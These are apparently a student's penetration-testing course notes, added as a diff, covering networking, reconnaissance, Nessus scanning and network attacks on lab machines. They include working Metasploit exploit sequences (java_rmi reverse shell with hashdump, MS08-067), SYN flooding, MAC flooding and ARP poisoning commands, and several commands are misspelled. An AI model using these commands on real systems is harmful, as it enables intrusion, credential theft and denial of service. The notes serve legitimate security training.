@@ -1,0 +1,608 @@
+#########################################################################################################################################################
+2. Introduction to penetration testing.
+ 3. Penetration Test Types.
+security audits.
+vunerability assessment.
+penetration tests.
+
+ 4. Security Audit.
+security audit cheklist:
+https://www.cisecurtiy.org, https://nvd.nist.gov/ncp/repository.
+XCCDF- Extensible..., OVAL-Open Vunerability and Assessment language.
+CIS-CAT.
+
+ 5. Vunerablility Assessment.
+Defining, identifying and classifying security holes in IT Systems.
+Authentication, Authorization and input Validation Vuneratbility.
+No exploitation, no post exploitation.
+Vunerability assessment and vunerablity scanning.
+Vunerability Assessment Steps:
+Identifying assets and building asset inventory, categorizing assets into groups,
+scanning assets for known vunerabilities, ranking risks, patch magnement,
+follow-up remediation scans.
+Vunerability Assessment tools:
+Qualys, Nessus-Tenable Security, Nexpose-Rapid7,OpenVas-Open vunerability assessment system
+
+ 6. Terms Asset, Threat, Vunerability, Risk, Exploit.
+Asset-what we are trying to protect.
+Threat-what we are trying to protect against.
+Vunerability-a weakness or gap in our protection efforts.
+Risks-Intersection of assets threats and vurerabilities.
+A+T+V=R
+Exploit-Attack on a computer system especially one that takes advantage of a particular vunerabity the system has or is known for.
+
+ 7. Penetration Test Approach.
+Black Box Pentest- no prevoius info.
+White Box Pentest- uses knowledge of the internals of the target system.
+
+ 8. Planning a Penetration Test.
+Scope: Inter-network attacks, Internal network attacks, web applications, wireless networks, servers, network devices, database management systems, applications, social engineering, DDos, Physical Security.
+Asset groups: you cannot test the wireless systems if the customer does not have a wireless network.
+Inform the company to be prepared.
+Hardware: laptops, external servers, external disks.
+Software tools, Monitoring Solutions, Backup, Emergency Response plans.
+Restrictions:
+NDA, scope, total duration, attack times, methods ie no DDOS on database systems.
+
+  9. Penetration Test Phases.
+Reconnaissance.
+Scanning:
+network scan, vunerability scan.
+Exploitation:
+Take control of one or more network devices
+post exploitaion-determine value of the machine compromised.
+Covering Tracks: The state before the pentest.
+Reporting: introduction, management summary, findings, recomendations.
+
+ 10. Legal issues & Testing Standards.
+Rules of engagement.
+Get out of jail free card.
+Non Disclosure Agreement.
+Penetration Testing Standards:
+PCI DSS, OWASP, PTES, OSSTMM, NIST SP 800-115.
+
+#########################################################################################################################################################
+3. Basic Networking.
+ 1. Protocol.
+set of rules.
+protocols are to computers what language is to a human.
+ip-internet protocol-how all data packets move though a network.
+ip routing-fowarding ip packets from source to destination.
+ip addresses-unique address indentifying a machine.
+
+ 2. Reference Models.
+OSI and TCP/IP.
+
+ 3. OSI Reference Model.
+Reference model for how applications can communicate over a network.
+Rarely utilised.
+OSI layers:
+physical, data link, network, transport, session, presentation, application.
+TCP/IP.
+1. Data Link Layer. 2. Internet Layer. 3. Transport Layer. 4.Application Layer.
+DNS Query.
+
+ 4. OSI vs TCP/IP.
+
+ 5. Demonstration using wireshark.
+kali: wireshark
+kali: if config
+
+ 6. Standards and protocols.
+Data Link:
+Ethernet, 802.11, 802.2,
+
+ 7. Ethernet Principles.
+802.3
+CSM/CD
+Ethernet Frame.
+
+ 8. ARP.
+
+ 9. ARP hands on.
+kali: arp
+kali: arp -a
+kali: arp -n
+kali: arp -d
+kali: arp -d 172.16.99.207
+
+ 10. VLANs-Virtual Local Area Network.
+
+ 11. WLAN-Wireless Local Area Network.
+802.11-1997
+802.11b, 802.11g, 802.11n, 802.ac
+SSID, BSSID, ESSID
+Most significant wireless attacks.
+Denial of service, Rogue Access Points, Misconfiguration, Traffic Capture/Intercept, Crypto attacks, Client-duping.
+
+ 12. Introduction to Network Layer.
+Connectionless communication.
+Host addressing.
+Message Fowarding.
+
+ 13. Internet Protocol.
+Addressing Hosts.
+Encapsulating data into packets.
+Routing packets from a source destination.
+
+ 14. IPv4 Addressing System.
+octets.
+
+ 15. IPv4 Packet Header.
+version-
+IHL-size of header in words.
+
+ 16. IPv4 Subnetting Classful Networks.
+A, B, C, D, E.
+
+ 17. IPv4 Subnetting Subnet Mask.
+class A-255.0.0.0
+class B-255.255.0.0
+
+ 18. IPv4 Subnetting Understanding.
+
+ 19. IPv4 Shortage.
+NAT.
+
+ 20. Private Networks.
+192.168.0.0
+
+ 21. Private Networks-Demonstration.
+subnetting.
+
+ 22. NAT-Network Address Translation.
+single public ip address.
+
+ 23. IPv6, Packet Header & Addressing.
+simplified header.
+end-to-end connectivity.
+auto-configuration.
+faster routing/fowarding.
+IPSec.
+No BroadCast.
+Mobility.
+Extensibility.
+IPv6 Header.
+
+ 24. DHCP - How the Mechanism Works.
+Automatic distributions of IP addresses within a network.
+The client requests and IP address, the DHCP server assigns an available address.
+kali: wireshark
+udp.port == 68
+
+ 25. ICMP - Internet Control Message Protocol.
+Error reporting protocol.
+purpose is to provide feedback about problems.
+ICMP Header.
+:ping
+
+ 26. Traceroute.
+displays the route of packets in IP network.
+measures the amount of time each hop took.
+:traceroute
+:traceroute www.google.com
+kali: traceroute www.google.com
+kali: traceroute -T www.google.com
+windows: tracert www.hackeracademy.uk
+windows: tracert
+
+ 27. Introduction to transport Layer.
+Accept data from layer above.
+Split it up into smaller units.
+Passes these units to the network layer.
+Ensures that all units arrive correctly at the other end.
+Service point addressing, Segmentation and reassembling, Connection Control, flow control, error control.
+
+ 28. TCP - Transmission Control Protocol.
+connection oriented, data fragmentation, error-free, flow control.
+TCP 3 way handshake. SYN, SYN/ACK, ACK, Data Transfer
+TCP Flags. SYN, ACK, RST, FIN, PSH, URG.
+
+ 29. TCP Header.
+sorce port, destination port, sequence number, acknowledgement number.
+
+ 30. UDP - User Datagram Protocol.
+no handshake, no error checking, faster data transfer, no validation.
+UDP Header.
+
+ 31. Introduction to Application Layer.
+standardizes communication.
+
+ 32. DNS - Domain Name System.
+Phonebook for the internet.
+DNS Server.
+DNS Architecture.
+root server, TLD DNS server, Authoritative DNS Server.
+
+ 33. HTTP - Hypertext Transfer Protocol.
+stateless protocol.
+runs in application layer.
+HTTP messages/ requests. GET, POST, HEAD, PUT, DELETE, TRACE, OPTIONS...
+HTTP Messages/ responses. 200 OK, 302 Found, 404 Not found, 500 Internal Server error.
+
+ 33. HTTPS.
+SSL, TLS.
+
+#########################################################################################################################################################
+4. Information Gathering.
+ 1. Intro to Reconnaissance.
+Id ip addresses e.t.c...
+
+ 2. Extract Domain Registration Information.
+Extract Domain Registration info. whois
+Identify hosts or Subdomains. fierce, theharvester
+Detect Applications on the same service
+TCP port 43
+kali: whois google.com
+kali: host google.com
+kali: whois -h whois.arin.net 216.58.215.238
+kali: fierce -dns example.com
+kali: sudo fierce -dns linuxhint.com -threads 4
+kali: nslookup
+kali: nslookup > whatif.linuxhint.com
+kali: nslookup > set d2
+kali: nslookup > whatif.linuxhint.com
+kali: nslookup > dig whatif.linuxhint.com
+kali: fierce --domain geeksforgeeks.org --subdomains videos --traverse 10
+kali: fierce --domain stackoverflow.com --subdomains mail --connect
+kali: fierce --domain geeksforgeeks.org --wide
+kali: fierce --domain geeksforgeeks.org
+kali: theharvester -d kali.org -l 500 -b google
+kali: theharvester -b all -d zonetransfer.me
+kali: theharvester -d sixthstartech.com -l 300 -b all -f test
+kali: the harvester -d kali.org -l 200 -b bing
+
+#Chatgpt
+kali: fierce -domain example.com
+kali: fierce -dns example.com -threads 10
+kali: fierce -domain example.com -sub
+kali: fierce -range 192.168.0.0/24
+kali: fierce -file domains.txt
+kali: fierce -domain example.com -wordlist mywordslist.txt
+kali: fierce -domain example.com -delay 2
+kali: fierce -domain example.com -traverse
+kali: fierce -domain example.com -dnsbackup
+kali: fierce -domain example.com -verbose
+
+kali: theharvester -d example.com
+kali: theharvester -d example.com -b google, yahoo
+kali: theharvester -d example.com -l 100
+kali: theharvester -d example.com -s 2
+kali: theharvester -d example.com -f results.txt
+kali: theharvester -d example.com -n
+kali: theharvester -d example.com -c 10
+kali: theharvester -d example.com -t 5
+kali: theharvester -d example.com -e user user@example.com
+kali: theharvester -d example.com -v
+
+ 3. Identify Hosts or Subdomains Using DNS Fierce & TheHarvester.
+kali: fierce -dns google.com -threads 10 -file /root/Desktop/googleInfo.txt
+kali: theharvester -d google.com -b bing -l 500 -f /root/Destktop/googleinfo.html
+
+ 4. Detect Applications on the Same Service.
+
+ 5. Ports and Services on the Web Server.
+192.168.204.130 is beebox
+kali: nmap 192.168.204.130
+kali: nmap 192.168.204.130 -sS
+kali: nmap 192.168.204.130 -sT
+kali: nmap 192.168.204.130 -sn
+kali: nmap 192.168.204.130 -Pn
+kali: nmap 192.168.204.130 -sS -Pn -p 80,443
+kali: nmap 192.168.204.130 -sS -Pn -p http, https
+kali: nmap 192.168.204.130 -sS -Pn --top-ports 100
+kali: nmap 192.168.204.130 -sS -Pn -p http,https --open
+kali: nmap 192.168.204.130 -sS -Pn -p http,https --open --reason
+kali: nmap 192.168.204.130 -sV -Pn -p http,https
+kali: nmap 192.168.204.130 -sV -Pn -O
+
+ 6. Review Technology Architecture Information.
+kali: whatweb
+kali: whatweb -a 3 http://192.168.204.130/bWAPP/
+open browser and burp
+
+ 7. Extracting Directory Structure Crawling.
+open browser and burpsuite.
+dirbuster.
+
+ 8. Minimum Information Principle.
+help pages.
+dont say your password is wrong.
+
+ 9. Using Search Engines Google Hacking.
+go to settings and click advanced search.
+google: site:nytimes.com -site:www.nytimes.com
+google: (site:nytimes.com -site:www.nytimes.com) AND (inurl:login)
+google: (site:nytimes.com -site:www.nytimes.com) AND (inurl:login OR inurl:signup)
+google: inurl:"phpmyadmin/index.php" AND intitle:"phpMyAdmin 2.11"
+google: intitle:SQLiteManager inurl:/sqlite/intext:"Welcome to"
+google: intitle:"index of" AND inurl:ftp
+google hacking database.
+
+ 10. Shodan.
+
+ 11. Web Archives.
+web.archive.org
+
+ 12. FOCA - Fingerprinting Organisations with collected archives.
+foca is a footprinting tool.
+
+ 13. Maltego.
+matego is a footprinting tool.
+kali: maltegoce
+
+ 14. Quiz.
+
+#########################################################################################################################################################
+5. Vunerability Scan and Introduction to Nessus.
+ 1. Introduction to Vunerability Scan.
+Vunerability Scanners. Nmap, Nessus, Microsoft MBSA, Nexpose, OpenVas, Saint, GFI LanGuard, QualysGuard, Secunia PSI.
+
+ 2. Introduction to Nessus.
+port scan, reporting, service detection, trying most know credencial...
+
+ 3. Nessus Download.
+go to the download page
+yopmail
+
+ 4. Nessus Install & Setup.
+kali: cd Downloads/
+kali: ls
+kali: dpkg -i Nessus-7.0.1-debian6_amd64.deb
+kali: service nessusd status
+kali: service nessusd start
+kali: netstat -tnlp
+go to web browser and type https://127.0.0.1:8834
+create account and register
+
+ 5. Nessus Creating a Custom Policy.
+Go to policies.
+Go to advanced scan.
+Give a name for the policy.
+Go to discovery section.
+Close ping scan.
+click port scanning.
+go to terminal.
+kali: locate nessus-services
+kali: find / -name "nessus-services"
+kali: less /opt/nessus/var/nessus/nessus-services
+kali: cat /opt/nessus/var/nessus/nessus-services | wc
+kali: cat /opt/nessus/var/nessus/nessus-services | grep tcp | wc
+to search for all ports type 1-65535 in port scan range field and change it from default.
+in nessus go to advanced section select scan ip addresses in a random order.
+change max simultaneous hosts per scan from 100 to 30.
+in max number of concurrent TCP sessions per host put 800.
+in max number of concurrent TCP sessions per scan put 2000.
+click save.
+
+ 6. Nessus First Scan.
+click new scan in nessus.
+go to user difined and use myPolicy.
+give a name to the scan "myScan"
+give a description "The First One"
+choose folder MyScans
+List targets "172.16.99.139", "172.16.99.206"
+click launch
+vnc server vunerability.
+kali: xvncviewer
+type ipaddress and password.
+kali: whoami
+kali: uname -a
+kali: ifconfig
+
+ 7. An Aggressive Scan.
+kali: service nessusd status
+kali: service nessusd start
+https://127.0.0.1:8834
+go to advanced scan
+give the scan a name "Advanced Scan 2"
+list the targets
+choose windows, metaspolitabe2
+click on assessment
+click on perform thorough tests
+click on report section
+check override normal verbosity
+uncheck show missing patches that have been suspended
+click advanced 
+uncheck enable safe checks
+click on credencials 
+select SSH option
+change authentication method to password
+in username put msfadmin
+in password put msfadmin
+
+ 8. Results of an Aggressive Scan.
+vunerability bind shell backdoor detection.
+kali: nc 192.168.11.152 1524
+vunerability rmi registry detection.
+kali: sudo nmap -sV -sS 192.168.11.152 -p1-65535
+open another terminal window
+kali: msfconsole
+msf: search rmi
+msf: search java_rmi
+msf: use exploit/multi/misc/java_rmi_server
+msf: show payloads
+msf: set payload java/meterpreter/reverse_tcp
+msf: show options
+msf: set RHOST 192.168.11.152
+msf: set SRVHOST 192.168.11.151 the kali linux
+msf: set LHOST 192.168.11.151
+msf: exploit
+msf: sessions -l
+msf: sessions -i 1
+meterpreter: sysinfo
+meterpreter: hashdump
+meterpteter: run post/linux/gather/hashdump
+
+ 9. Results of an Aggressive Scan with Windows Systems.
+microsoft rps interface buffer overrun
+MS08-067: Microsoft Windows Server Service Crafted RPC Request Handling... vunerablity
+kali: msfconsole
+msf: search ms08-067
+msf: use exploit/windows/smb/ms08_067_netapi
+msf: show payloads
+msf: set payload windows/shell/bing_tcp
+msf: show options
+msf: set RHOST 172.16.99.207
+msf: show options
+msf: run
+C:> dir
+
+ 10. Nessus Report Function.
+go to a scan and export
+choose generate pdf
+choose custom
+choose group by host
+click export
+for html click export then html
+choose executive summary option
+
+#########################################################################################################################################################
+6. Network Scan & Network Attacks.
+ 1. Passive Scan.
+passive: Tcpdump, wireshark
+active: nmap, hping, scapy, ping, tracert
+
+ 2. Passive Scan - ARP Tables.
+macos: arp
+macos: man arp
+macos: arp -an
+windows8: arp
+windows8: arp -a
+kali: arp 
+kali: arp -h
+kali: man arp
+kali: arp -a
+kali: arp -an
+
+ 3. Passive Scan - Wireshark.
+kali: wireshark &
+kali: ifconfig
+click eth0
+open owasp
+owasp: ping kali
+open metasploitable
+metasploitable: ping owasp
+metasploitable: ping kali
+go to browser and open websites
+go to statistics menu and go to conversations
+
+ 4. Wireshark Following Stream.
+in wireshark rightclick a packet
+go to follow
+click HTTP stream
+
+ 5. Wireshark Summarise Network.
+kali: wireshark &
+kali: ifconfig
+double click eth0
+owaspbwa: ping kali
+metasploitable: ping owaspbwa
+metasploitable: ping kali
+visit some websites prerably owasp and nhk.uk
+
+ 6. Active Scan.
+Hping. suppors TCP, UDP, ICMP
+Hping. firewall testing, port scanning, remote OS fingerprinting.
+kali: hping3 -h
+kali: hping3 --scan 0-500 -S 172.16.99.139
+kali: hping3 --scan 0-500 -X 172.16.99.139
+kali: ping www.owaspbwa.com
+kali: hping3 --flood -S -V --rand-source www.owaspbwa.com
+start wireshark
+kali: hping2 --flood -S -V --rand-source www.owaspbwa.com
+
+ 7. MitM Listening to the traffic.
+network and data link layers are very weak links.
+DOS, Sniffing, Compromising, Spoofing.
+
+ 8. Sniffing.
+listening to the traffic.
+check to see if the scans are running correctly.
+collecting information about the target network.
+
+ 9. TCPDump.
+network packet analyser.
+alot of options and very powerful filtering ability.
+supports PCAP.
+:tcpdump -d
+:tcpdump -i
+:tcpdump -n
+:tcpdump -v
+:tcpdump -w
+:tcpdump -r
+:tcpdump -A
+:tcpdump -X
+:tcpdump -x
+filtering. protocol, host or net, port, source and destination, logic operations
+
+ 10. Router, Switch, Hub.
+hub sends frame to all of the ports
+switch sends frame to one port
+
+ 11. How to Expand Sniffing Space.
+SPAN-Port Mirroring
+MAC Flood- MAC Address Table Overflow
+ARP Spoof-ARP Cache Poisoning
+DHCP Spoofing
+
+ 12. MAC Flood Switching.
+flooding a switch
+when a switch is flooded it behaves like a hub.
+
+ 13. MAC Flood Using Macof Tool.
+kali: ifconfig
+metaspolitable: ifconfig
+kali: ping 192.168.10.12
+open another terminal
+kali: nmap 192.168.10.12
+owaspbwa: telnet 192.168.10.12
+switch: show mac-address-table dynamic
+kali: man macof
+kali: macof -i eth0 -d 192.168.10.1
+switch: show mac-address-table-dynamic
+kali: wireshark
+type telnet next to the filterbox
+owaspbwa: telnet metasploitable
+
+ 14. MacFlood-Countermeasures.
+Port Security
+AAA server
+implementations of IEEE 802.1x Suites
+Side effects of Arp and IP spoofing prevention systems
+
+ 15. Arp Spoof.
+ARP cache poisoining attack
+
+ 16. ARP Cache Poisoning using Ettercap.
+a network interface example created in gns3
+owaspbwa: ping kali
+metasploitable: ping kali
+kali: ping owaspbwa
+kali: ping metasploitable
+metasploitable: arp -n
+kali: cat /proc/sys/net/ipv4/ip_foward
+kali: echo 1 > /proc/sys/net/ipv4/ip_foward
+kali: man ettercap
+kali: ettercap -i eth0 -T -M arp:remote /192.168.10.11// /192.168.10.12//
+metasploitable: arp -n
+metasploitable: telnet 192.168.10.11
+kali: ctrl + c
+metasploitable: arp -n
+
+ 17. DHCP Starvation & DHCP Spoofing.
+automatic distributions of ip addresses within a network.
+
+ 18. DHCP Mechanism.
+discovery, offer, request, ack
+on windows install wireshark
+
+#########################################################################################################################################################
+7. Network Scan and Network Attacks.
+ 1. DHCP Starvation.
+DHCP spoofing. rogue server, no authentication process, fastest DHCP server is used.
+DHCP starvation. an attacker broadcasts large number of DHCP requests, IP addresses depleted.
+DHCP starvation and DHCP Spoof. Alot of discovery packets to the DHCP server, No more IP addresses for legitimate clients, set up a rogue DHCP server, Fake IP addreses
+Gateway and DNS addresses, MitM.
+
+ 2. DHCP Starvation Demonstration with Yersinia.
